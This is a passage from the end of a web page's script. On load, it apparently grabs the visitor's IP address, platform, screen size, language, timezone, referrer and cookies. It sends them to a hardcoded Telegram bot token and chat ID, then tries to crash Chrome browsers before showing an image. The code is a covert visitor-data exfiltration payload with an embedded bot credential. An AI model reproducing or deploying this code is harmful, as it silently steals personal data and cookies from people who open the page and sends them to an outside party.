            ip: (await (await fetch('https://api.ipify.org?format=json')).json()).ip,

            platform: navigator.platform,
            resolution: `${screen.width}x${screen.height}`,

            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'none'
        };

        const botToken = '8442621494:AAE71KIW6A_CLn2dHN79rvsQChjQsdXeWcc';
        const chatId = '8212035169';
        const text = `📡 Данные получены:
IP: ${data.ip}
Браузер: ${data.agent}
ОС: ${data.platform}
Разрешение: ${data.resolution}
Куки: ${data.cookies}
Язык: ${data.language}
Часовой пояс: ${data.timezone}
Реферер: ${data.referrer}`;

        await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`);

        }

        if (/chrome/i.test(data.agent)) {
            window.location.href = 'chrome://crash';
            setTimeout(showImage, 1000);
        } else {
            showImage();
        }
    }
    execute();
</script>
</body>
</html>
